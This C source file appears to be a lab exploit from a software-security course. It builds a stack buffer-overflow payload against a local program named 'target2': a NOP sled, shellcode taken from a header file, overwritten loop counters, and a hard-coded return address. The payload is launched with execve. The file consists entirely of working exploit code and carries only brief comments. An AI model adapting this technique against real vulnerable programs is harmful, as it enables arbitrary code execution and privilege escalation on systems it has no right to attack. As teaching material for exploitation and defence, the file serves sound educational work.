#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

#define RETURN_ADDR "\x80\xfd\x21\x20"
#define LEN_ADDR "\x1c\x01\x00\x00"
#define I_ADDR "\x17\x01\x01\x01"
#define NOP 0x90

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[2];


	// int * ret = 0x2021fe98;
	// int * i = 0x2021fe8c;
	// int * len = 0x2021fe88;
	// int * buf = 0x2021fd80; // new ret

	char exploit_buffer[285];
	int shellcode_size = strlen(shellcode);
	
	// Copy the buffer with shellcode first
	memset(exploit_buffer, NOP, 285);
	memcpy(exploit_buffer, shellcode, shellcode_size);

	// Overwrite the i and len
	memcpy(&exploit_buffer[264], LEN_ADDR, 4);
	memcpy(&exploit_buffer[268], I_ADDR, 4);

	// Override the return address
	memcpy(&exploit_buffer[280], RETURN_ADDR, 4);
	exploit_buffer[284] = '\0';


	args[0] = TARGET;
	args[1] = exploit_buffer;
	args[2] = NULL;

	env[0] = "\x00";
	env[1] = &exploit_buffer[268];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
